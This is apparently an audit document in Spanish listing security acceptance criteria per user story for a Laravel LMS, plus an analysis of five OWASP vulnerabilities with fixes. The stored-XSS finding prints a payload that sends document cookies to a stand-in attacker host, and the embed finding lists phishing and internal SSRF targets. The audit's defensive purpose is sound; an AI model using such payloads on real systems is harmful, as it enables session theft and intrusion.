# Seguridad por Historia de Usuario

Documento de requisitos de seguridad y criterios de aceptación específicos del LMS-CMS, derivados de las historias de usuario definidas en [readme.md](./readme.md#5-historias-de-usuario).

## Índice

1. [Alcance y exclusiones](#alcance-y-exclusiones)
2. [Criterios por historia de usuario (HU-1 … HU-12)](#hu-1--crear-cursos)
3. [Matriz resumen OWASP ↔ Historias](#matriz-resumen-owasp--historias-de-usuario)
4. [Trazabilidad](#trazabilidad)
5. [Análisis de vulnerabilidades detectadas (OWASP Top 10)](#análisis-de-vulnerabilidades-detectadas-owasp-top-10)
   - [V1 — XSS almacenado en contenido de lecciones](#v1--xss-almacenado-en-contenido-de-lecciones-a03-injection)
   - [V2 — Acceso directo a archivos subidos](#v2--acceso-directo-a-archivos-subidos-sin-autorización-a01-broken-access-control)
   - [V3 — URLs de embed sin validar en plugins](#v3--urls-de-embed-sin-validar-en-plugins-a03-injection--a10-ssrf)
   - [V4 — Integridad del quiz comprometida](#v4--integridad-del-quiz-comprometida-a04-insecure-design--a08-integrity-failures)
   - [V5 — Escalada de privilegios en matriculación](#v5--escalada-de-privilegios-en-matriculación-a01-broken-access-control)

---

Este documento cubre únicamente los riesgos y controles **ligados al flujo funcional de cada historia de usuario**. Los siguientes controles se consideran **transversales a la aplicación** y se documentan/implementan a nivel global (ver sección 2.5 de `readme.md`):

- Autenticación, gestión de sesiones y cierre de sesión.
- Autorización basada en roles (`teacher` / `student`) y middleware `EnsureRole`.
- Cifrado de datos en tránsito (TLS/HTTPS).
- Protección CSRF en formularios.
- Hash de contraseñas y políticas de credenciales.

Las referencias a OWASP se alinean con el [OWASP Top 10 (2021)](https://owasp.org/Top10/).

---

## HU-1 — Crear cursos

**Historia de usuario:** Como profesor quiero crear cursos para organizar mi contenido educativo.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-1-S01 | Los campos de creación de curso (título, descripción, metadatos) se validan en servidor con tipos, longitudes máximas y conjunto de caracteres permitidos; los errores no revelan estructura interna de la base de datos. | A03 Injection |
| HU-1-S02 | Cada curso queda vinculado al `user_id` del profesor creador; las operaciones posteriores sobre ese curso verifican **propiedad del recurso**, no solo el rol genérico. | A01 Broken Access Control |
| HU-1-S03 | Solo se permiten asignar en creación los atributos definidos en la lista blanca del modelo (`$fillable` / DTO); campos sensibles (`id`, `status`, `user_id` ajeno) no son asignables desde la petición. | A04 Insecure Design |
| HU-1-S04 | El título y la descripción se escapan o sanitizan al renderizar en vistas Blade para evitar almacenamiento y ejecución de XSS. | A03 Injection |

### Requisitos no funcionales

- Longitud máxima de título: 255 caracteres; descripción: límite configurable (p. ej. 10 000 caracteres).
- Respuesta ante intento de creación con datos inválidos: HTTP 422 con mensajes genéricos.
- Registro de auditoría (usuario, timestamp, `course_id`) en operaciones de alta.

---

## HU-2 — Añadir lecciones a un curso

**Historia de usuario:** Como profesor quiero añadir lecciones a un curso para estructurar el material.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-2-S01 | La lección solo puede crearse si el `course_id` pertenece al profesor autenticado; peticiones con `course_id` de terceros devuelven HTTP 403/404 sin filtrar existencia del recurso. | A01 Broken Access Control |
| HU-2-S02 | El campo `content` (JSON) se valida contra un esquema permitido (tipos de bloque, profundidad, tamaño máximo en bytes); JSON malformado o excesivamente grande se rechaza. | A03 Injection / A04 Insecure Design |
| HU-2-S03 | Al renderizar el contenido de la lección, cualquier fragmento HTML/texto procedente del JSON se trata como no confiable (escape contextual o sanitización con lista blanca). | A03 Injection |
| HU-2-S04 | La posición (`position`) y `due_at` se validan en servidor; no se aceptan valores negativos, fechas incoherentes ni manipulación de orden fuera del curso autorizado. | A04 Insecure Design |

### Requisitos no funcionales

- Tamaño máximo del JSON de contenido: definido y aplicado en servidor (p. ej. 512 KB).
- Inserción de lección y preguntas asociadas en transacción atómica para evitar estados inconsistentes.

---

## HU-3 — Publicar un curso

**Historia de usuario:** Como profesor quiero publicar un curso para que los estudiantes accedan.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-3-S01 | La transición de estado `draft` → `published` solo es ejecutable por el propietario del curso; no existe endpoint que permita publicar cursos ajenos mediante manipulación de identificadores. | A01 Broken Access Control |
| HU-3-S02 | No se permite publicar un curso sin al menos una lección válida (regla de negocio que reduce exposición de recursos vacíos o mal configurados). | A04 Insecure Design |
| HU-3-S03 | Tras publicar, las respuestas de listado y detalle para estudiantes no incluyen metadatos internos de borrador ni campos de depuración. | A01 Broken Access Control |
| HU-3-S04 | La invalidación de caché del listado de cursos publicados se ejecuta de forma controlada para evitar servir contenido obsoleto tras cambios de visibilidad. | A08 Software and Data Integrity Failures |

### Requisitos no funcionales

- La acción de publicación es idempotente: repetir la petición sobre un curso ya publicado no altera integridad ni genera efectos secundarios no deseados.
- Evento de auditoría registrado al cambiar el estado de publicación.

---

## HU-4 — Plugins interactivos con drag & drop

**Historia de usuario:** Como profesor quiero añadir plugins interactivos con drag & drop.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-4-S01 | Las subidas de archivos (vídeo, imagen, adjuntos) validan extensión, MIME real, tamaño máximo (128 MB) y almacenan fuera del directorio público ejecutable; el acceso se sirve mediante rutas controladas, no por URL directa predecible. | A01 Broken Access Control / A05 Security Misconfiguration |
| HU-4-S02 | Se rechazan archivos con extensiones ejecutables (`.php`, `.js`, `.svg` con script, etc.) y dobles extensiones engañosas. | A03 Injection |
| HU-4-S03 | Los plugins de tipo vídeo/enlace validan el esquema de URL (`https` preferente); se bloquean peticiones a rangos IP privados, `localhost` y metadatos de cloud internos (prevención SSRF en embeds). | A10 Server-Side Request Forgery |
| HU-4-S04 | La configuración JSON de cada instancia de plugin se valida por `plugin_type` (campos obligatorios, tipos y límites); no se aceptan claves arbitrarias que alteren comportamiento del motor de renderizado. | A08 Software and Data Integrity Failures |
| HU-4-S05 | Contenido H5P y bloques HTML se renderizan en contexto restringido (iframe `sandbox` o sanitización estricta) para mitigar XSS almacenado. | A03 Injection |
| HU-4-S06 | Las operaciones de reordenamiento y borrado de plugins verifican que la instancia pertenece a una lección del curso del profesor solicitante. | A01 Broken Access Control |

### Requisitos no funcionales

- Límite de instancias de plugin por lección (p. ej. 50) para mitigar agotamiento de recursos.
- Nombres de fichero almacenados con identificadores no predecibles (UUID), nunca el nombre original del cliente.

---

## HU-5 — Gestión dinámica de preguntas del quiz

**Historia de usuario:** Como profesor quiero gestionar preguntas del quiz dinámicamente.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-5-S01 | El texto de la pregunta y las opciones se validan (longitud, número mínimo/máximo de opciones ≥ 2) y se sanitizan al mostrar. | A03 Injection |
| HU-5-S02 | La respuesta correcta (`correct_answer`) y el detalle de corrección **no** se incluyen en respuestas API o vistas del estudiante antes del envío del quiz. | A01 Broken Access Control |
| HU-5-S03 | Las opciones JSON se serializan de forma segura; no se evalúa código ni se interpretan plantillas del lado del servidor a partir del contenido del profesor. | A03 Injection |
| HU-5-S04 | Alta, edición y borrado de preguntas verifican que la lección/cuestionario pertenece al curso del profesor autenticado. | A01 Broken Access Control |

### Requisitos no funcionales

- Límite de preguntas por lección (p. ej. 100) y de opciones por pregunta (p. ej. 10).
- Inserción masiva de preguntas dentro de transacción con rollback ante fallo parcial.

---

## HU-6 — Asignar usuarios a un curso (drag & drop)

**Historia de usuario:** Como profesor quiero asignar usuarios a un curso mediante drag & drop.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-6-S01 | Solo se pueden matricular usuarios existentes con rol `student`; no se crean usuarios ni se elevan privilegios desde el panel de matriculación. | A04 Insecure Design |
| HU-6-S02 | Las APIs JSON de matriculación (`POST`/`DELETE`) verifican propiedad del curso y devuelven 403/404 ante `course_id` o `user_id` no autorizados. | A01 Broken Access Control |
| HU-6-S03 | Se impide la matriculación duplicada y se valida la integridad referencial (`user_id`, `course_id`) en servidor, independientemente del estado del cliente drag & drop. | A08 Software and Data Integrity Failures |
| HU-6-S04 | Las respuestas del panel de matriculación no exponen datos personales innecesarios (solo identificadores y nombre/email requeridos para la operación). | A02 Cryptographic Failures* |

\* *Minimización de exposición de PII en el contexto de la funcionalidad, no cifrado en tránsito.*

### Requisitos no funcionales

- Límite de peticiones de matriculación por minuto por curso (rate limiting funcional) para mitigar abuso automatizado.
- Registro de auditoría: quién matriculó/desmatriculó a quién y cuándo.

---

## HU-7 — Ver cursos publicados (estudiante)

**Historia de usuario:** Como estudiante quiero ver cursos publicados.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-7-S01 | El listado y detalle de cursos para estudiantes filtran estrictamente por `status = published`; cursos en `draft` no son accesibles ni por enumeración de IDs. | A01 Broken Access Control |
| HU-7-S02 | Un estudiante no matriculado no accede al contenido de lecciones de un curso publicado hasta completar la matriculación (si aplica la regla de negocio). | A01 Broken Access Control |
| HU-7-S03 | Las respuestas no incluyen datos del profesor más allá de lo necesario (p. ej. no exponer email completo si no es requisito funcional). | A02 Cryptographic Failures* |

### Requisitos no funcionales

- Paginación obligatoria en listados para evitar respuestas voluminosas susceptibles a agotamiento de recursos.

---

## HU-8 — Visualizar lecciones con plugins (estudiante)

**Historia de usuario:** Como estudiante quiero visualizar lecciones con plugins interactivos.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-8-S01 | El acceso a `/lessons/{lesson}` verifica matriculación en el curso y estado publicado; IDs de lección ajenos devuelven 403/404. | A01 Broken Access Control |
| HU-8-S02 | Todo contenido generado por plugins del profesor se trata como no confiable al renderizar (escape/sanitización/CSP) para prevenir XSS almacenado cross-usuario. | A03 Injection |
| HU-8-S03 | Los recursos multimedia servidos desde almacenamiento validan que el solicitante tiene acceso al curso/lección asociada, no solo la URL del fichero. | A01 Broken Access Control |
| HU-8-S04 | Las interacciones con plugins (`/plugins/instances/{instance}/interact`) validan que la instancia pertenece a la lección visible por el estudiante. | A01 Broken Access Control |

### Requisitos no funcionales

- Cabeceras de seguridad en respuestas de lección: `Content-Security-Policy` restrictiva para iframes y scripts inline procedentes de contenido educativo.
- Desactivar ejecución de JavaScript inline no sanitizado en bloques de código del profesor salvo en entorno aislado.

---

## HU-9 — Responder cuestionarios y recibir puntuación

**Historia de usuario:** Como estudiante quiero responder cuestionarios y recibir puntuación.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-9-S01 | La puntuación se calcula **exclusivamente en servidor** a partir de las respuestas enviadas y las preguntas almacenadas; el cliente no puede enviar `score` ni `total` manipulables. | A04 Insecure Design |
| HU-9-S02 | Las respuestas enviadas se validan contra los IDs de pregunta existentes en la lección; opciones fuera de conjunto o preguntas ajenas se rechazan. | A03 Injection |
| HU-9-S03 | Se aplica política de reenvío definida (una entrega por lección/usuario o ventana temporal); reintentos no autorizados no sobrescriben resultados sin regla explícita. | A08 Software and Data Integrity Failures |
| HU-9-S04 | La respuesta al estudiante tras el envío no revela las respuestas correctas de otras preguntas ni de otros usuarios. | A01 Broken Access Control |

### Requisitos no funcionales

- Tiempo máximo de procesamiento del envío acotado; respuesta HTTP 422 ante payload malformado.
- Persistencia de `quiz_results` vinculada a `user_id` + `lesson_id` con restricción de unicidad según política de negocio.

---

## HU-10 — Ver progreso del estudiante

**Historia de usuario:** Como estudiante quiero ver mi progreso.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-10-S01 | Las consultas de progreso filtran por `user_id` de la sesión autenticada; no es posible obtener progreso de otro estudiante variando parámetros. | A01 Broken Access Control |
| HU-10-S02 | Los endpoints y vistas de progreso no aceptan `user_id` como parámetro manipulable por el cliente. | A01 Broken Access Control |
| HU-10-S03 | Los datos agregados mostrados al estudiante provienen únicamente de cursos en los que está matriculado. | A01 Broken Access Control |

### Requisitos no funcionales

- Las marcas de lección completada se registran en servidor tras validar consumo real de la lección (no solo petición GET).

---

## HU-11 — Calendario académico y eventos propios (profesor)

**Historia de usuario:** Como profesor quiero ver un calendario académico mensual y crear eventos propios para planificar el curso.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-11-S01 | El CRUD de `academic_calendar_events` verifica que el evento pertenece al profesor creador o a un curso de su propiedad; edición/borrado por ID ajeno devuelve 403/404. | A01 Broken Access Control |
| HU-11-S02 | Los campos `title`, `type`, `starts_at` y `ends_at` se validan en servidor (`ends_at` ≥ `starts_at`, rango de fechas razonable, tipos de evento en lista blanca). | A03 Injection / A04 Insecure Design |
| HU-11-S03 | El título y descripción del evento se escapan al renderizar en el calendario para evitar XSS almacenado visible por estudiantes matriculados. | A03 Injection |
| HU-11-S04 | Los eventos derivados de lecciones (`due_at`) y matriculaciones solo muestran información del ámbito académico del usuario (curso propio o matriculado). | A01 Broken Access Control |

### Requisitos no funcionales

- Límite de eventos personalizados por profesor/curso (p. ej. 500) para mitigar abuso de almacenamiento.
- Borrado lógico o físico con confirmación en UI; operación registrada en auditoría.

---

## HU-12 — Cambio de idioma de la interfaz (ES/EN)

**Historia de usuario:** Como usuario quiero cambiar el idioma de la interfaz (ES/EN) y ver la navegación traducida.

### Criterios de aceptación de seguridad

| ID | Criterio | OWASP |
|----|----------|-------|
| HU-12-S01 | El parámetro `locale` en `/locale/{locale}` solo acepta valores de lista blanca (`es`, `en`); cualquier otro valor se rechaza o normaliza sin error verbose. | A03 Injection |
| HU-12-S02 | Tras el cambio de idioma, la redirección vuelve a una ruta interna relativa validada; no se aceptan URLs absolutas externas en parámetros de retorno (prevención de open redirect). | A01 Broken Access Control |
| HU-12-S03 | El valor de locale se almacena en sesión/server-side; no se propaga a consultas SQL ni a inclusión de ficheros de traducción fuera de `lang/{locale}/`. | A03 Injection |
| HU-12-S04 | Las cadenas inyectadas vía `window.lmsT()` en el cliente provienen exclusivamente de los ficheros de traducción del servidor, no de entrada del usuario. | A03 Injection |

### Requisitos no funcionales

- El middleware `SetLocale` se ejecuta antes del renderizado de cualquier vista autenticada.
- Los ficheros de idioma adicionales futuros deben seguir la misma convención de ruta y revisión de contenido estático.

---

## Matriz resumen OWASP ↔ Historias de usuario

| Categoría OWASP Top 10 | Historias donde aplica (específico) |
|------------------------|-------------------------------------|
| A01 Broken Access Control | HU-1, HU-2, HU-3, HU-4, HU-5, HU-6, HU-7, HU-8, HU-9, HU-10, HU-11, HU-12 |
| A02 Cryptographic Failures (minimización PII) | HU-6, HU-7 |
| A03 Injection (XSS, validación entrada) | HU-1, HU-2, HU-4, HU-5, HU-8, HU-9, HU-11, HU-12 |
| A04 Insecure Design | HU-1, HU-2, HU-3, HU-6, HU-9, HU-11 |
| A05 Security Misconfiguration | HU-4 (subidas y límites) |
| A08 Software and Data Integrity Failures | HU-3, HU-4, HU-6, HU-9 |
| A10 Server-Side Request Forgery | HU-4 (embeds de vídeo/enlace) |

---

## Trazabilidad

| Historia | Ticket relacionado | PR relacionado |
|----------|-------------------|----------------|
| HU-1, HU-2, HU-3 | Ticket 2 | PR 2 |
| HU-4 | Ticket 4 | PR 4 |
| HU-5, HU-9, HU-10 | Ticket 3 | PR 3 |
| HU-6 | Ticket 5 | PR 5 |
| HU-4 (subidas) | Ticket 6 | PR 6 |
| HU-11 | Ticket 7 | PR 7 |
| HU-12 | Ticket 8 | PR 8 |

---

## Análisis de vulnerabilidades detectadas (OWASP Top 10)

Análisis estático del código en `codigofinal/lms-cms-laravel12`, priorizado por impacto en las historias de usuario (HU-2, HU-4, HU-6, HU-8, HU-9). Se excluyen controles ya cubiertos a nivel global (autenticación, roles, TLS, CSRF).

Cada vulnerabilidad se documenta de forma completa — descripción, evidencia, ejemplo de explotación e impacto, y solución — antes de pasar a la siguiente.

---

### V1 — XSS almacenado en contenido de lecciones (A03: Injection)

**Severidad:** Crítica  
**Historias afectadas:** HU-2, HU-8  
**Estado:** Detectada en código actual

#### Descripción

El editor de lecciones permite al profesor guardar HTML enriquecido (Quill) dentro del campo JSON `content`. La vista del estudiante renderiza ese HTML con directivas Blade **sin escapar** (`{!! !!}`), lo que convierte cualquier fragmento malicioso en XSS almacenado ejecutable en el navegador de todos los alumnos matriculados.

#### Evidencia en código

En `resources/views/lessons/show.blade.php`, el contenido de página y los bloques de texto se inyectan tal cual:

```blade
<div class="ql-editor">{!! $page['html'] ?? '' !!}</div>
...
<div class="ql-editor">{!! $block['value'] ?? '' !!}</div>
```

El profesor persiste ese HTML vía `LessonController::updateContent`, que acepta el array `pages` sin sanitización HTML:

```php
$lesson->update(['content' => $validated['pages']]);
```

#### Ejemplo concreto de explotación

1. Un profesor (o un atacante que comprometa su cuenta) edita una lección y en el editor Quill inserta en modo HTML:
   ```html
   <img src=x onerror="fetch('https://atacante.evil/log?c='+document.cookie)">
   ```
2. Guarda el contenido (`PATCH /lessons/{id}/content`).
3. Cualquier estudiante matriculado abre `/lessons/{id}`.
4. El script se ejecuta en el contexto de la sesión del estudiante → robo de cookie de sesión, acciones en nombre del usuario o redirección a phishing.

**Por qué es la vulnerabilidad más importante:** afecta a **todos** los consumidores del contenido (HU-8), el vector es persistente (almacenado en BD) y el impacto es ejecución de código en el cliente con privilegios del estudiante autenticado.

#### Impacto

| Dimensión | Efecto |
|-----------|--------|
| Confidencialidad | Robo de sesión, exfiltración de datos visibles en la página |
| Integridad | Acciones no autorizadas vía JavaScript (envío de quiz, cambio de perfil si no hay protección adicional) |
| Disponibilidad | Defacement de la interfaz de lección |

#### Solución propuesta

1. **Sanitizar en servidor al guardar:** integrar una librería de whitelist HTML (p. ej. `HTMLPurifier` o `stevebauman/purify`) en `UpdateLessonContentRequest` / `LessonController::updateContent`, permitiendo solo etiquetas seguras (`p`, `b`, `i`, `ul`, `li`, `a[href]`, `img[src]` sin event handlers).
2. **Escapar al renderizar como defensa en profundidad:** sustituir `{!! !!}` por `{{ }}` donde el contenido deba ser texto plano; donde se requiera HTML, pasar siempre por el mismo sanitizador en la vista:
   ```blade
   <div class="ql-editor">{!! clean($page['html'] ?? '') !!}</div>
   ```
3. **Cabecera CSP** en respuestas de lección: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';` para bloquear scripts inline residual.
4. **Test de regresión:** test Feature que cree una lección con `<script>alert(1)</script>` y verifique que la salida renderizada no contiene `<script>`.

---

### V2 — Acceso directo a archivos subidos sin autorización (A01: Broken Access Control)

**Severidad:** Alta  
**Historias afectadas:** HU-4, HU-8  
**Estado:** Detectada en código actual

#### Descripción

Los vídeos de lecciones y los assets de plugins se almacenan en el disco `public` de Laravel (`storage/app/public`). El enlace generado (`/storage/plugin-assets/{id}/…` o `/storage/lesson-content/{id}/…`) es **público y predecible**, sin comprobar si quien descarga el fichero está autenticado o matriculado en el curso.

#### Evidencia en código

En `PluginController::uploadAsset`:

```php
$path = $file->store('plugin-assets/'.$instance->id, 'public');
// ...
'uri' => '/storage/'.$path,
```

En `LessonController::uploadContentVideo`:

```php
$path = $request->file('file')->store('lesson-content/'.$lesson->id, 'public');
return response()->json(['url' => asset('storage/'.$path)]);
```

Nginx sirve `/storage/` como fichero estático; no interviene `LessonPolicy::viewAsStudent`.

#### Ejemplo concreto de explotación

1. Un estudiante matriculado sube o visualiza una lección con vídeo local y obtiene la URL:
   `http://localhost:8080/storage/lesson-content/3/abc123.mp4`
2. Comparte la URL por chat o la extrae del HTML de la página.
3. Un usuario **no autenticado** (o un estudiante **no matriculado** en ese curso) abre la URL directamente en el navegador.
4. El vídeo se descarga/reproduce sin ninguna comprobación de sesión ni matriculación.

**Justificación:** viola el principio de mínimo privilegio de HU-8 (solo alumnos matriculados deberían acceder al material) y expone material educativo restringido o PII en grabaciones.

#### Impacto

| Dimensión | Efecto |
|-----------|--------|
| Confidencialidad | Fuga de contenido de cursos, vídeos privados, documentos PDF/DOCX subidos como plugin |
| Integridad | No altera datos, pero facilita distribución no autorizada |
| Disponibilidad | Posible hotlinking y agotamiento de ancho de banda |

#### Solución propuesta

1. **Almacenar en disco privado** (`local` o `s3` con bucket no público), no en `public`:
   ```php
   $path = $file->store('plugin-assets/'.$instance->id, 'local');
   ```
2. **Ruta de descarga controlada** con autorización:
   ```php
   Route::get('/media/{asset}', [MediaController::class, 'show'])
       ->middleware('auth')
       ->name('media.show');
   ```
   En el controlador: resolver el asset, cargar la lección asociada y `Gate::authorize('viewAsStudent', $lesson)` (o `update` para profesor).
3. **URLs firmadas y temporales** (Laravel `Storage::temporaryUrl`) para S3, o tokens HMAC con expiración para servidores locales.
4. **Renombrar ficheros** con UUID (ya parcialmente cubierto por Laravel `store()`); no incluir `original_name` en la ruta pública.
5. **Test:** petición GET a `/storage/lesson-content/1/x.mp4` sin cookie de sesión debe devolver 403 o 404 tras el cambio.

---

### V3 — URLs de embed sin validar en plugins (A03: Injection / A10: SSRF)

**Severidad:** Alta  
**Historias afectadas:** HU-4, HU-8  
**Estado:** Detectada en código actual

#### Descripción

Los plugins `video_embed` y `h5p_embed` insertan la URL configurada por el profesor directamente en un `<iframe>` o `<video>`, sin lista blanca de dominios ni validación de esquema. Esto abre la puerta a **iframes maliciosos** (phishing, clickjacking) y, en escenarios de red interna, a **SSRF del lado cliente** hacia servicios no expuestos públicamente.

#### Evidencia en código

`resources/views/plugins/_h5p_embed.blade.php`:

```blade
<iframe src="{{ $settings['embed_url'] ?? '' }}" ...></iframe>
```

`resources/views/plugins/_video_embed.blade.php` — si la URL no es YouTube/Vimeo/local, se usa tal cual:

```blade
<iframe src="{{ $embedUrl }}" width="100%" height="400" ...></iframe>
```

`PluginController::update` acepta `settings_json` como array libre sin validar campos por tipo de plugin.

#### Ejemplo concreto de explotación

**Escenario A — Phishing embebido**

1. Profesor (o cuenta comprometida) configura un plugin `video_embed` con URL:
   `https://falso-login-lms.evil/clone-dashboard`
2. Los estudiantes ven un iframe a página de phishing dentro del entorno LMS de confianza.
3. Mayor tasa de éxito en robo de credenciales por contexto visual legítimo.

**Escenario B — SSRF hacia servicios internos (Docker)**

1. Profesor configura `h5p_embed` con:
   `http://phpmyadmin:80` o `http://localhost:8082` (phpMyAdmin del `docker-compose.yml`).
2. El navegador del estudiante (o del profesor en preview) carga el iframe contra el panel de administración de BD expuesto en desarrollo.
3. Si el servicio interno no requiere auth adicional, se expone la interfaz de gestión.

**Justificación:** el contenido del iframe se presenta bajo la apariencia del LMS; en entornos Docker la combinación con [A05 Security Misconfiguration](#v2--acceso-directo-a-archivos-subidos-sin-autorización-a01-broken-access-control) amplifica el riesgo.

#### Impacto

| Dimensión | Efecto |
|-----------|--------|
| Confidencialidad | Phishing de credenciales; posible acceso visual a consolas internas |
| Integridad | Contenido engañoso mostrado como material oficial del curso |
| Disponibilidad | Iframes a recursos pesados pueden degradar la experiencia |

#### Solución propuesta

1. **Validar `settings_json` por slug de plugin** en `PluginController::update` / `store` con reglas dedicadas:
   ```php
   // video_embed
   'settings_json.url' => ['required', 'url', 'regex:/^https:\/\/(www\.)?(youtube\.com|youtu\.be|vimeo\.com)\//'],
   // h5p_embed
   'settings_json.embed_url' => ['required', 'url', 'starts_with:https://h5p.org/'],
   ```
2. **Rechazar** URLs con esquemas `javascript:`, `data:`, IPs privadas (RFC 1918), `localhost`, `127.0.0.1` y metadatos cloud (`169.254.169.254`).
3. **Atributo `sandbox`** en iframes de terceros:
   ```blade
   <iframe src="{{ $embedUrl }}" sandbox="allow-scripts allow-same-origin" ...>
   ```
4. **Transformar URLs** a formato embed solo para dominios permitidos (como ya hace YouTube/Vimeo); para cualquier otro dominio → rechazar.
5. **Test Feature:** profesor intenta guardar plugin con `embed_url=http://127.0.0.1:8082` → respuesta 422.

---

### V4 — Integridad del quiz comprometida (A04: Insecure Design / A08: Integrity Failures)

**Severidad:** Media-Alta  
**Historias afectadas:** HU-9, HU-10  
**Estado:** Detectada en código actual

#### Descripción

El endpoint `POST /quiz/submit` recalcula la puntuación en servidor (correcto), pero **no limita el número de intentos** ni impide sobrescribir el progreso. Cada envío crea un nuevo `QuizResult` y marca la lección como completada incondicionalmente.

#### Evidencia en código

`QuizController::submit`:

```php
QuizResult::create([
    'user_id' => $request->user()->id,
    'lesson_id' => $lesson->id,
    'score' => $score,
    'total' => $total,
]);

Progress::updateOrCreate(
    ['user_id' => $request->user()->id, 'lesson_id' => $lesson->id],
    ['completed_at' => now()],
);
```

No existe restricción `unique(user_id, lesson_id)` en `quiz_results` ni comprobación de intento previo. `SubmitQuizRequest` solo exige `lesson_id` y `answers` — no valida que las claves de `answers` correspondan a IDs de pregunta de la lección (más allá del cálculo que ignora IDs desconocidos).

#### Ejemplo concreto de explotación

1. Estudiante abre lección con quiz de 5 preguntas y envía respuestas aleatorias → score 1/5.
2. Repite `POST /quiz/submit` con distintas combinaciones (automatizable con script).
3. En el intento N acierta todas → score 5/5.
4. Cada intento ejecuta `Progress::updateOrCreate` → la lección queda **completada** incluso con puntuación baja en intentos anteriores.
5. Un informe de progreso (HU-10) mostrará la lección como completada independientemente de la política académica de aprobación.

**Variante:** enviar `answers` vacío o con IDs inventados — el score es 0 pero el progreso igualmente se marca completado, falseando el seguimiento.

#### Impacto

| Dimensión | Efecto |
|-----------|--------|
| Confidencialidad | Bajo (no filtra respuestas correctas directamente; las opciones ya están en el HTML) |
| Integridad | **Alto** — puntuaciones y progreso no fiables para evaluación académica |
| Disponibilidad | Reenvíos masivos pueden generar carga en BD (`quiz_results`) |

#### Solución propuesta

1. **Política de intentos** en `QuizController::submit`:
   ```php
   $attempts = QuizResult::where('user_id', $user->id)
       ->where('lesson_id', $lesson->id)->count();
   abort_if($attempts >= 3, 422, 'Máximo de intentos alcanzado');
   ```
2. **Restricción de unicidad** según regla de negocio — migración:
   ```sql
   UNIQUE (user_id, lesson_id)  -- si solo se permite un intento
   ```
   o tabla `quiz_attempts` con número de intento y mejor puntuación.
3. **Validar claves de respuestas** en `SubmitQuizRequest`:
   ```php
   'answers' => ['required', 'array', new AnswersMatchLessonQuestions($lesson)],
   ```
4. **Desacoplar progreso de envío:** marcar `completed_at` solo si `score / total >= umbral` (p. ej. 0.6) o tras primer envío válido según política documentada.
5. **Test Feature:** dos envíos consecutivos con política de 1 intento → segundo devuelve 422; progreso no se marca si score < umbral.

---

### V5 — Escalada de privilegios en matriculación (A01: Broken Access Control)

**Severidad:** Media  
**Historias afectadas:** HU-6  
**Estado:** Detectada en código actual

#### Descripción

El panel de matriculaciones permite al gestor del curso asignar usuarios con `role: teacher` además de `student`. Un profesor propietario puede añadir **cualquier usuario del sistema con rol teacher global** como co-docente del curso, otorgándole permisos de gestión (`canManageCourse`) sobre contenido, matriculaciones y publicación.

#### Evidencia en código

`EnrollmentController::enroll`:

```php
$validated = $request->validate([
    'user_id' => ['required', 'integer', 'exists:users,id'],
    'role' => ['required', 'in:teacher,student'],
]);
// ...
CourseEnrollment::updateOrCreate(
    ['course_id' => $course->id, 'user_id' => $user->id],
    ['role' => $validated['role'], 'enrolled_at' => now()],
);
```

`User::canManageCourse` concede gestión si el usuario está matriculado con pivot `role = teacher`:

```php
return $this->enrolledCourses()
    ->whereKey($course->id)
    ->wherePivot('role', 'teacher')
    ->exists();
```

#### Ejemplo concreto de explotación

1. Profesor A crea el curso «Ingeniería de Software» (curso id=5).
2. Desde `/courses/5/enrollments`, arrastra al profesor B (`teacher@example.com`) al panel de matriculados con `role: teacher`.
3. Profesor B (que no creó el curso) accede a `/courses/5`, edita lecciones, matricula alumnos y publica/despublica el curso.
4. Si Profesor A es eliminado o deja la institución, Profesor B mantiene control total sin ser el `user_id` propietario.

**Justificación:** HU-6 describe asignación de usuarios al curso, pero no prevé que un docente pueda delegar **permisos de gestión** a terceros sin controles adicionales; esto es escalada horizontal de privilegios a nivel de recurso.

#### Impacto

| Dimensión | Efecto |
|-----------|--------|
| Confidencialidad | Co-docentes no autorizados acceden a borradores y listados de alumnos |
| Integridad | Terceros pueden alterar contenido, quizzes y matriculaciones |
| Disponibilidad | Publicar/despublicar curso por actor no previsto |

#### Solución propuesta

1. **Restringir roles en matriculación** al caso de uso HU-6 (solo estudiantes), salvo flujo explícito de «añadir co-docente»:
   ```php
   'role' => ['required', 'in:student'],  // endpoint enroll por defecto
   ```
2. **Endpoint separado** `POST /courses/{course}/co-teachers` protegido por política `CoursePolicy::inviteTeacher`, limitado al propietario (`user_id`) o rol `Admin`.
3. **Auditoría obligatoria** en `course_enrollments` con `invited_by_user_id` y notificación al usuario añadido.
4. **Límite de co-docentes** por curso y confirmación explícita en UI («X podrá editar y publicar este curso»).
5. **Test Feature:** profesor no propietario intenta `POST /courses/{id}/enrollments` con `role: teacher` → 403.

---

## Referencias

- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- Código fuente analizado: `codigofinal/lms-cms-laravel12`
- Controles globales: [readme.md § 2.5](./readme.md#25-seguridad)
